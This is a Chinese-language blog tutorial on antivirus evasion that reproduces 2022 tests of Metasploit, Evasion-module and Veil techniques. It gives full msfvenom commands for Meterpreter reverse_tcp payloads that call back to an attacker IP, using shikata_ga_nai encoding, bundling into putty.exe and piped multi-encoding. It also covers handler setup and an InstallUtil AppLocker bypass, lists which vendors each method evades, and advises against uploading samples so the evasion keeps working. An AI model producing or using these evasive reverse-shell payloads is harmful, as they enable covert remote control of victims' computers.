title="动态检测"></a>动态检测</h3><p>动态检测针对样本文件内存中的状态进行检测：</p><ul><li>内存特征码检测：对于静态文件特征码来说，可以将shellcode做多次加密，完全抹掉其原本特征，降低杀软的报毒率。但是当进入内存需要执行代码时，shellcode需要完全解密，这时候杀软只需要遍历内存，根据特征码进行查杀即可。</li><li>敏感API检测（HOOK）：在关键的入口或道路进行监控，如果单次或多次触发警告，比如读取并修改了其他进程的内存，或在其他进程中开了个远程线程将触发告警。对于不同杀软的不同策略，将根据调用顺序、调用源、参数判断是否是正常调用。</li><li>敏感行为检测：实现一个功能，不一定非要用某一个固定的接口，因此，实现一个读写内存操作，单检测一个API是无效的。此时，只要对象触发了某种行为，在其他进程中开了线程，那么就判定为恶意行为。常见的病毒恶意行为：<ul><li>注册表操作：添加启动项、添加服务。</li><li>文件操作：写入文件、读取系统文件、删除文件、移动文件。</li><li>进程操作：杀死进程、创建进程。</li><li>用户操作：添加用户、删除用户、删除用户。</li><li>其他操作：注入、劫持等。</li></ul></li></ul><p>常见的绕过思路：</p><ul><li>绕过动态检测的方式通常是白名单调用敏感行为，再导入恶意内容</li></ul><p>常用的动态检测平台：</p><ul><li><a href="https://s.threatbook.cn/">https://s.threatbook.cn/</a></li></ul><h3 id="流量检测"><a href="#流量检测" class="headerlink" title="流量检测"></a>流量检测</h3><p>流量检测针对恶意程序在网络通讯流量层面上的状态进行检测：</p><ul><li>结构特征：此类特征一般是指已知远控的恶意程序心跳包，比如CS beacon心跳包特征，会按照攻击者设置的频率发送固定结构固定内容的数据包以证明存活。</li><li>内容特征：此类特征一般是指各类漏洞的exp流量包特征、冰蝎、哥斯拉等流量特征，对于此类流量可以编写流量规则进行过滤检测，比如suricata规则、wireshark规则等。</li><li>IP&#x2F;域名&#x2F;证书匹配：对于数据包中的ip域名等信息，链接威胁情报平台查询是否存在恶意行为，比如扫描、用作C2回连或网站挂马等，对于此类流量可以选择弹窗告警或直接阻断。</li></ul><p>常见的绕过思路：</p><ul><li>绕过流量检测的方式通常有TCP分段传输、内容加密、使用合法证书等</li></ul><h3 id="云查杀"><a href="#云查杀" class="headerlink" title="云查杀"></a>云查杀</h3><p>云查杀的不同点在于它的病毒库是放在服务器端的，而不是本地客户端，只要联网，病毒库就会同步更新，病毒库更加强大。</p><p>当开着杀软的云查杀的时候，有时候刚开始没报病毒，但过一会就提示病毒了。</p><h2 id="免杀原理"><a href="#免杀原理" class="headerlink" title="免杀原理"></a>免杀原理</h2><h3 id="静态免杀"><a href="#静态免杀" class="headerlink" title="静态免杀"></a>静态免杀</h3><h4 id="修改特征码"><a href="#修改特征码" class="headerlink" title="修改特征码"></a>修改特征码</h4><p>特征码是能够识别一个程序的不大于64字节的字符。</p><p>修改特征码是在不改变程序运行效果的前提下，更改其特征码。</p><p>修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。</p><h4 id="花指令免杀"><a href="#花指令免杀" class="headerlink" title="花指令免杀"></a>花指令免杀</h4><p>花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。</p><p>为一个程序添加一段花指令之后，程序的部分偏移会受到影响，如果反病毒软件不能识别这段花指令，那么它检测特征码的偏移量会整体位移一段位置，也就无法正常检测木马了。</p><h4 id="加壳免杀"><a href="#加壳免杀" class="headerlink" title="加壳免杀"></a>加壳免杀</h4><p>软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。</p><p>加壳能够掩盖特征码，特别是对于不开源的PE文件，加壳可以绕过很多特征码识别。但是壳也有自己的特征，主流的壳例如VMP、Themida等，被检测出将直接报毒。</p><p>可以用一些冷门的加密壳，或基于开源压缩壳做二次开发。</p><p>加壳工具：</p><ul><li>ASPack</li><li>UPX</li></ul><h3 id="动态免杀"><a href="#动态免杀" class="headerlink" title="动态免杀"></a>动态免杀</h3><h4 id="API免杀"><a href="#API免杀" class="headerlink" title="API免杀"></a>API免杀</h4><ul><li><p>替换API：杀软不可能拦截所有API，可以使用相同功能的API进行替换，例如<code>MoveFileEx</code>替换<code>MoveFile</code>。</p></li><li><p>重写API：逆向后完全重写系统API功能，实现对应功能的API。</p></li><li><p>底层API：寻找更底层的API进行调用，绕过拦截，例如NT函数。或者通过DeviceloControl函数调用驱动功能来完成API功能，模拟系统调用。</p></li></ul><h4 id="内存免杀"><a href="#内存免杀" class="headerlink" title="内存免杀"></a>内存免杀</h4><p>在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。加壳时，需要加一个混淆程序原有代码的壳，才能躲过杀软查杀。</p><h4 id="二次编译"><a href="#二次编译" class="headerlink" title="二次编译"></a>二次编译</h4><p>Metasploit的Msfvenom提供了多种格式的Payload和Encoder，生成的Shellcode也为二次加工提供了很大便利。</p><p>Shikata_ga_nai是MSF中唯一的评价是excellent的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样的，还可以利用管道进行多重编码进行免杀。</p><p>目前Msfvenom的Encoder特征基本都进入了杀软的漏洞库，很难实现单一Encoder编码而绕过杀软，所以对Shellcode进行进一步修改编译成了MSF免杀的主流。有很多借助于C、C#、python等语言对Shellcode进行二次编码从而达到免杀的效果。</p><h4 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h4><p>例如Payload分离免杀和Webshell分离免杀，将Shellcode和加载器分离，实现简单，但效果不错。</p><h4 id="资源修改"><a href="#资源修改" class="headerlink" title="资源修改"></a>资源修改</h4><p>有些杀软会设置有扫描白名单，比如之前把程序图标替换为360安全卫士图标就能过360的查杀。</p><ul><li>添加资源：使用ResHacker将正常软件的资源加入到恶意软件，例如图片、版本信息、对话框等</li><li>替换资源：使用ResHacker替换无用的资源，例如版本等</li><li>添加签名：使用签名伪造工具，将正常软件的签名信息添加到恶意软件</li></ul><h1 id="免杀技术研究"><a href="#免杀技术研究" class="headerlink" title="免杀技术研究"></a>免杀技术研究</h1><h2 id="Bypass一览表（2020年）"><a href="#Bypass一览表（2020年）" class="headerlink" title="Bypass一览表（2020年）"></a>Bypass一览表（2020年）</h2><p><img src="/./images/202205261702163.png"></p><p><img src="/./images/202205261701678.png"></p><h2 id="Bypass一览表（2022年）"><a href="#Bypass一览表（2022年）" class="headerlink" title="Bypass一览表（2022年）"></a>Bypass一览表（2022年）</h2><p>VirusTotal对应杀软及名称：</p><ul><li>卡巴：Kaspersky</li><li>微软：Microsoft</li><li>瑞星：Rising</li><li>金山：Kingsoft</li><li>江民：Jiangmin</li><li>趋势：TrendMicro</li></ul><table><thead><tr><th>序号</th><th>免杀方法</th><th>2020年VT</th><th>2022年VT</th><th>360</th><th>QQ</th><th>火绒</th><th>卡巴</th><th>McAfee</th><th>微软</th><th>Symantec</th><th>瑞星</th><th>金山</th><th>江民</th><th>趋势</th></tr></thead><tbody><tr><td>1</td><td>未免杀处理</td><td>53&#x2F;69</td><td>51&#x2F;69</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>√</td><td>√</td><td></td></tr><tr><td>2</td><td>msf自编码</td><td>51&#x2F;69</td><td>48&#x2F;67</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>√</td><td>√</td><td></td></tr><tr><td>3</td><td>msf自捆绑</td><td>39&#x2F;69</td><td>15&#x2F;69</td><td></td><td>√</td><td>√</td><td>√</td><td></td><td>√</td><td>√</td><td></td><td>√</td><td>√</td><td>√</td></tr><tr><td>4</td><td>msf捆绑+编码</td><td>35&#x2F;68</td><td>16&#x2F;69</td><td></td><td>√</td><td>√</td><td>√</td><td></td><td>√</td><td>√</td><td></td><td>√</td><td>√</td><td>√</td></tr><tr><td>5</td><td>msf多重编码</td><td>45&#x2F;70</td><td>28&#x2F;67</td><td></td><td>√</td><td>√</td><td></td><td>√</td><td>√</td><td>√</td><td></td><td>√</td><td>√</td><td>√</td></tr><tr><td>6</td><td>Evasion模块exe</td><td>42&#x2F;71</td><td>43&#x2F;69</td><td></td><td>√</td><td></td><td></td><td></td><td></td><td></td><td></td><td>√</td><td>√</td><td>√</td></tr><tr><td>7</td><td>Evasion模块hta</td><td>14&#x2F;59</td><td>（None）</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>8</td><td>Evasion模块csc</td><td>12&#x2F;71</td><td>33&#x2F;69</td><td></td><td>√</td><td></td><td>√</td><td></td><td></td><td>√</td><td></td><td>√</td><td>√</td><td>√</td></tr><tr><td>9</td><td>Veil原生exe</td><td>44&#x2F;71</td><td>44&#x2F;69</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>√</td><td></td><td>√</td></tr><tr><td>10</td><td>Veil+gcc编译</td><td>23&#x2F;71</td><td>11&#x2F;69</td><td></td><td>√</td><td></td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>11</td><td>Venom生成exe</td><td>19&#x2F;71</td><td>35&#x2F;68</td><td></td><td>√</td><td></td><td></td><td></td><td>√</td><td></td><td></td><td>√</td><td></td><td>√</td></tr><tr><td>12</td><td>Venom生成dll</td><td>11&#x2F;71</td><td>（None）</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>13</td><td>Shellter生成exe</td><td>7&#x2F;69</td><td>12&#x2F;65</td><td></td><td>√</td><td></td><td>√</td><td>√</td><td></td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>14</td><td>msf生成exe</td><td>-</td><td>51&#x2F;69</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>√</td><td>√</td><td></td></tr><tr><td>15</td><td>C&#x2F;C++2：动态内存</td><td>24&#x2F;71</td><td>36&#x2F;69</td><td></td><td>√</td><td></td><td></td><td></td><td></td><td></td><td></td><td>√</td><td></td><td>√</td></tr><tr><td>16</td><td>C&#x2F;C++3：嵌入汇编</td><td>12&#x2F;71</td><td>36&#x2F;69</td><td></td><td>√</td><td></td><td></td><td></td><td></td><td></td><td></td><td>√</td><td></td><td>√</td></tr><tr><td>17</td><td>C&#x2F;C++4：强制转换</td><td>9&#x2F;70</td><td>34&#x2F;68</td><td></td><td>√</td><td></td><td></td><td></td><td></td><td></td><td></td><td>√</td><td></td><td>√</td></tr><tr><td>18</td><td>C&#x2F;C++5：汇编花指令</td><td>12&#x2F;69</td><td>37&#x2F;69</td><td>√</td><td>√</td><td></td><td></td><td></td><td></td><td></td><td></td><td>√</td><td></td><td>√</td></tr><tr><td>19</td><td>C&#x2F;C++6：XOR加密</td><td>15&#x2F;71</td><td>21&#x2F;69</td><td></td><td>√</td><td></td><td></td><td></td><td>√</td><td></td><td></td><td>√</td><td></td><td>√</td></tr><tr><td>20</td><td>C&#x2F;C++7：base64加密1</td><td>28&#x2F;69</td><td>21&#x2F;68</td><td>√</td><td>√</td><td></td><td>√</td><td></td><td>√</td><td></td><td></td><td>√</td><td>√</td><td>√</td></tr><tr><td>21</td><td>C&#x2F;C++8：base64加密2</td><td>28&#x2F;69</td><td>17&#x2F;67</td><td>√</td><td>√</td><td></td><td>√</td><td></td><td>√</td><td></td><td></td><td>√</td><td>√</td><td>√</td></tr></tbody></table><h2 id="复现环境（2022年）"><a href="#复现环境（2022年）" class="headerlink" title="复现环境（2022年）"></a>复现环境（2022年）</h2><p>时间：2022.05</p><p>攻击机：192.168.174.128</p><p>免杀方法：</p><ul><li>此处仅介绍msf、Evasion、Veil、Venom、C&#x2F;C++ Shellcode，其余方法参见原po：<a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></li></ul><p>原po各杀软版本：</p><ul><li>360杀毒版本5.0.0.8160(2019.12.12)</li><li>火绒版本5.0.33.13(2019.12.12)</li><li>360安全卫士12.0.0.2001(2019.12.17)</li></ul><p>本文各杀软版本：</p><ul><li>火绒版本5.0.68.2(2022.05.26)</li><li>360安全卫士13.0.0.2003(2022.05.26)</li></ul><p>测试平台：</p><ul><li>Virustotal，以下简称VT。VT查杀率代表静态查杀能力。</li></ul><p>【注意】</p><ul><li><p>如果是自己做免杀，建议测试机不要连互联网，更不要上传到virustotal.com类似的平台上。</p></li><li><p>不要上传！</p></li><li><p>不要上传！</p></li><li><p>不要上传！</p></li><li><p>上传一次以后，你自己辛辛苦苦写的免杀可能就不再免杀了。</p></li></ul><h2 id="Metasploit自带免杀"><a href="#Metasploit自带免杀" class="headerlink" title="Metasploit自带免杀"></a>Metasploit自带免杀</h2><p>Payload均使用MSF的windows&#x2F;meterperter&#x2F;reverse_tcp模块生成。</p><p>攻击机MSF监听6666端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploits/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 192.168.174.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><h3 id="原生态payload-VT查杀率51-69"><a href="#原生态payload-VT查杀率51-69" class="headerlink" title="原生态payload(VT查杀率51&#x2F;69)"></a>原生态payload(VT查杀率51&#x2F;69)</h3><p>MSF生成原始payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -f exe -o /mnt/hgfs/Share/payload1.exe</span><br></pre></td></tr></table></figure><p><img src="/./images/202205261904148.png" alt="image-20220526190423066"></p><p>360和火绒都能查杀。</p><p>在virustotal.com上查杀率为51&#x2F;69（原po为53&#x2F;69）。</p><p>360：</p><p><img src="/./images/202205261901055.png" alt="image-20220526190107987"></p><p>火绒：</p><p><img src="/./images/202205261905876.png" alt="image-20220526190513816"></p><p>VT查杀成功：</p><p><img src="/./images/202205261909679.png" alt="image-20220526190921570"></p><p>VT查杀失败：</p><p><img src="/./images/202205261909529.png" alt="image-20220526190959477"></p><h3 id="msf自编码免杀-VT查杀率48-67"><a href="#msf自编码免杀-VT查杀率48-67" class="headerlink" title="msf自编码免杀(VT查杀率48&#x2F;67)"></a>msf自编码免杀(VT查杀率48&#x2F;67)</h3><p>使用<code>msfvenom --list encoders</code>可查看所有编码器。</p><p>评级最高的两个encoder为cmd&#x2F;powershell_base64和x86&#x2F;shikata_ga_nai，其中x86&#x2F;shikata_ga_nai也是免杀中使用频率最高的一个编码器。</p><p>使用<code>x86/shikata_ga_nai</code>生成payload，参数<code>-i</code>为编码次数，使用<code>-b</code>参数去掉payload中的空字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 15  -f exe -o /mnt/hgfs/Share/payload2.exe</span><br></pre></td></tr></table></figure><p><img src="/./images/202205261913186.png" alt="image-20220526191328018"></p><p>由于shikata_ga_nai编码技术是多态的，也就是说每次生成的payload文件都不一样，有时生成的文件会被查杀，有时却不会。当然这个也和编码次数有一定关系，编码次数好像超过70次就经常生成出错，但是编码次数多并不代表免杀能力强。</p><p>360和火绒都能查杀。</p><p>在virustotal.com上查杀率为48&#x2F;67（原po为51&#x2F;69）。</p><p>360：</p><p><img src="/./images/202205261914178.png" alt="image-20220526191412121"></p><p>火绒：</p><p><img src="/./images/202205261915497.png" alt="image-20220526191549429"></p><p>VT查杀成功：</p><p><img src="/./images/202205261918483.png" alt="image-20220526191847382"></p><p>VT查杀失败：</p><p><img src="/./images/202205261918665.png" alt="image-20220526191857605"></p><h3 id="msf自捆绑免杀-VT查杀率15-69"><a href="#msf自捆绑免杀-VT查杀率15-69" class="headerlink" title="msf自捆绑免杀(VT查杀率15&#x2F;69)"></a>msf自捆绑免杀(VT查杀率15&#x2F;69)</h3><p>在生成payload时可以使用捆绑功能，使用msfvenom的<code>-x</code>参数可以指定一个自定义的可执行文件作为模板,并将payload嵌入其中，<code>-x</code>后面跟对应文件路径就可以。</p><p>这里使用一个正规的<code>putty.exe</code>作为被捆绑测试软件。</p><p>生成payload命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666  -x putty.exe  -f exe -o /mnt/hgfs/Share/payload3.exe</span><br></pre></td></tr></table></figure><p><img src="/./images/202205261921270.png" alt="image-20220526192124189"></p><p>生成的两个文件对比，大小完全一样。能否免杀也和被捆绑exe有一定关系，可以选微软的一些工具作为模板exe程序。</p><p><img src="/./images/202205261922615.png" alt="image-20220526192251559"></p><p>360能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒也能查杀）。</p><p>在virustotal.com上查杀率为15&#x2F;69（原po为39&#x2F;69）。</p><p>360：</p><p><img src="/./images/202205261925172.png" alt="image-20220526192548112"></p><p>VT：</p><p><img src="/./images/202205261932310.png" alt="image-20220526193243216"></p><h3 id="msf自捆绑-编码-VT查杀率16-69"><a href="#msf自捆绑-编码-VT查杀率16-69" class="headerlink" title="msf自捆绑+编码(VT查杀率16&#x2F;69)"></a>msf自捆绑+编码(VT查杀率16&#x2F;69)</h3><p>将上面的编码和捆绑两种方法结合一下进行尝试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o /mnt/hgfs/Share/payload4.exe</span><br></pre></td></tr></table></figure><p><img src="/./images/202205261933974.png" alt="image-20220526193359812"></p><p>与上一种方法对比，大小完全一样。</p><p><img src="/./images/202205261935858.png" alt="image-20220526193552798"></p><p>可修改-i编码次数，编码次数越多，生成的payload越可能免杀，经测试，编码5次和6次可免杀360。</p><p>360能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒动态静态均能查杀，而360不会报毒）。</p><p>在virustotal.com上查杀率为16&#x2F;69（原po为35&#x2F;69）。</p><p>360：</p><p><img src="/./images/202205261940527.png" alt="image-20220526194032466"></p><p>VT：</p><p><img src="/./images/202205261938216.png" alt="image-20220526193813109"></p><h3 id="msfvenom多重编码-VT查杀率28-67"><a href="#msfvenom多重编码-VT查杀率28-67" class="headerlink" title="msfvenom多重编码(VT查杀率28&#x2F;67)"></a>msfvenom多重编码(VT查杀率28&#x2F;67)</h3><p>msfvenom的encoder编码器可以对payload进行一定程度免杀，同时还可以使用msfvenom多重编码功能，通过管道，让msfvenom用不同编码器反复编码进行混淆。</p><p>如下命令，使用管道让<code>msfvenom</code>对攻击载荷多重编码，先用<code>shikata_ga_nai</code>编码20次，接着来10次的<code>alpha_upper</code>编码，再来10次的<code>countdown</code>编码，最后才生成以<code>putty.exe</code>为模板的可执行文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=192.168.174.128 LPORT=6666 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o /mnt/hgfs/Share/payload5.exe</span><br></pre></td></tr></table></figure><p>如果报错<code>Error: You must select an arch for a custom payload</code>，则添加参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-a x86 --platform windows</span><br></pre></td></tr></table></figure><p><img src="/./images/202205261949206.png" alt="image-20220526194938055"></p><p>还有更多重编码姿势：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.74.133 LPORT=5110 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b &quot;&amp;&quot; -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe &gt; payload6.exe</span><br></pre></td></tr></table></figure><p>经过测试，发现使用的编码类型越多，免杀率可能会降低，猜测是因为各种编码引入了更多的特征码。同时生成的payload也很可能无法正常执行，这个也和被捆绑程序有一定关联。</p><p>360可以查杀，火绒不能查杀。</p><p>在virustotal.com上查杀率为28&#x2F;67（原po为45&#x2F;70），Bypass了McAfee。</p><p>360：</p><p><img src="/./images/202205261951182.png" alt="image-20220526195103114"></p><p>VT：</p><p><img src="/./images/202205261956521.png" alt="image-20220526195652390"></p><h2 id="Metasploit-Evasion免杀"><a href="#Metasploit-Evasion免杀" class="headerlink" title="Metasploit Evasion免杀"></a>Metasploit Evasion免杀</h2><p>2019年1月，metasploit升级到了5.0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马。evasion有以下几个模块,可以使用<code>show evasion</code>进行查看。</p><p>msf6 evasion模块：</p><p><img src="/./images/202205270847820.png" alt="image-20220527084747663"></p><h3 id="生成exe-VT查杀率43-69"><a href="#生成exe-VT查杀率43-69" class="headerlink" title="生成exe(VT查杀率43&#x2F;69)"></a>生成exe(VT查杀率43&#x2F;69)</h3><p>使用<code>use windows/windows_defender_exe</code>进行生成payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use windows/windows_defender_exe</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set filename payload.exe</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set LHOST 192.168.174.128</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set LPORT 6666</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure><p><img src="/./images/202205270855472.png" alt="image-20220527085549361"></p><p>不打开杀软的情况下，可正常上线：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>打开杀软，360和火绒都能查杀。</p><p>在virustotal.com上查杀率为43&#x2F;69（原po为42&#x2F;71）。</p><p>360：</p><p><img src="/./images/202205270858477.png" alt="image-20220527085842405"></p><p>火绒：</p><p><img src="/./images/202205270857265.png" alt="image-20220527085747182"></p><p>VT：</p><p><img src="/./images/202205270900839.png" alt="image-20220527090002712"></p><h3 id="生成hta-VT查杀率14-59"><a href="#生成hta-VT查杀率14-59" class="headerlink" title="生成hta(VT查杀率14&#x2F;59)"></a>生成hta(VT查杀率14&#x2F;59)</h3><p>用另外一个evasion模块<code>windows/windows_defender_js_hta</code>生成一下，360同样被杀。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use windows/windows_defender_js_hta</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set filename payload1.exe</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set LHOST 192.168.174.128</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; set LPORT 6666</span><br><span class="line">msf6 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure><p>但是火绒静态+行为查杀都没发现问题，可正常上线。</p><p>在virustotal.com上查杀率为14&#x2F;59。不过在线查毒时显示360也没查出来，但本地测试时却是能查出来的，所以在线查杀还是不太精准的。</p><p>复现时该模块生成的可执行无法运行。</p><h3 id="生成install-util-VT查杀率33-69"><a href="#生成install-util-VT查杀率33-69" class="headerlink" title="生成install_util(VT查杀率33&#x2F;69)"></a>生成install_util(VT查杀率33&#x2F;69)</h3><p>evasion还提供了其他几个模块，比如<code>windows/applocker_evasion_install_util</code></p><p>创建payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use windows/applocker_evasion_install_util</span><br><span class="line">msf6 evasion(windows/applocker_evasion_install_util) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 evasion(windows/applocker_evasion_install_util) &gt; set lhost 192.168.174.128</span><br><span class="line">msf6 evasion(windows/applocker_evasion_install_util) &gt; set lport 6666</span><br><span class="line">msf6 evasion(windows/applocker_evasion_install_util) &gt; run</span><br><span class="line"></span><br><span class="line">[+] install_util.txt stored at /Users/xysoul/.msf4/local/install_util.txt</span><br><span class="line">[*] Copy install_util.txt to the target</span><br><span class="line">[*] Compile using: C:\Windows\Microsoft.Net\Framework\[.NET Version]\csc.exe /out:install_util.exe install_util.txt</span><br><span class="line">[*] Execute using: C:\Windows\Microsoft.Net\Framework\[.NET Version]\InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</span><br></pre></td></tr></table></figure><p>根据说明，需要使用csc.exe进行编译一下，然后用<code>InstallUtil.exe</code>加载文件。</p><p>csc.exe是微软.NET Framework 中的C#语言编译器，本机安装了.net后就可以找到该文件。用vs2017里的csc.exe进行编译，生成install_util.exe。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.Net\Framework\v2.0.50727\csc.exe /out:install_util.exe install_util.txt</span><br></pre></td></tr></table></figure><p><img src="/./images/202205270927923.png" alt="image-20220527092742869"></p><p>直接执行<code>install_util.exe</code>，无法上线，并且360查杀报毒。</p><p>根据说明，需要使用<code>InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</code>来加载，才能成功上线。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.Net\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe</span><br></pre></td></tr></table></figure><p>注意的是，如果生成的是32位的payload，就要用32位的.net下的InstallUtil来加载，否则文件会无法执行。</p><p><img src="/./images/202205270931141.png" alt="image-20220527093115067"></p><p>360和火绒都能查杀（原po静态查杀都没有问题，执行时360行为查杀会报毒）。</p><p>在virustotal.com上查杀率为33&#x2F;69（原po为12&#x2F;71）。</p><p>360：</p><p><img src="/./images/202205270932856.png" alt="image-20220527093207774"></p><p>火绒：</p><p><img src="/./images/202205270935961.png" alt="image-20220527093508879"></p><p>VT：</p><p><img src="/./images/202205270936872.png" alt="image-20220527093615742"></p><h2 id="Veil免杀"><a href="#Veil免杀" class="headerlink" title="Veil免杀"></a>Veil免杀</h2><p>Veil、Venom和Shellter是三大老牌免杀工具。</p><p>Veil-Evasion是一个用python写的免杀框架，可以将任意脚本或一段shellcode转换成Windows可执行文件，还能利用Metasploit框架生成相兼容的Payload工具，从而逃避了常见防病毒产品的检测。</p><h3 id="安装Veil"><a href="#安装Veil" class="headerlink" title="安装Veil"></a>安装Veil</h3><p>推荐Docker方式进行安装。镜像地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hub.docker.com/r/mattiasohlsson/veil/</span><br></pre></td></tr></table></figure><p>拉取veil镜像：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mattiasohlsson/veil</span><br></pre></td></tr></table></figure><p>拉取成功后，执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil</span><br></pre></td></tr></table></figure><p><code>-v /tmp/veil-output:/var/lib/veil/output:Z</code>是将宿主机的<code>/tmp/veil-output</code>目录映射到docker里面，这样veil生成的payload可以直接在宿主机里使用。</p><p>之后再进入镜像可以在启动镜像后使用下面命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it &lt;container id&gt; /bin/bash</span><br></pre></td></tr></table></figure><p>执行<code>veil</code>命令可启动,版本为3.1.1。</p><p>veil有两个免杀的工具，Evasion和Ordnance。Ordnance可生成在Veil-Evasion中使用的shellcode，Evasion是用做文件免杀。一般选择Evasion。</p><figure class="highlight plaintext"><table><tr><td 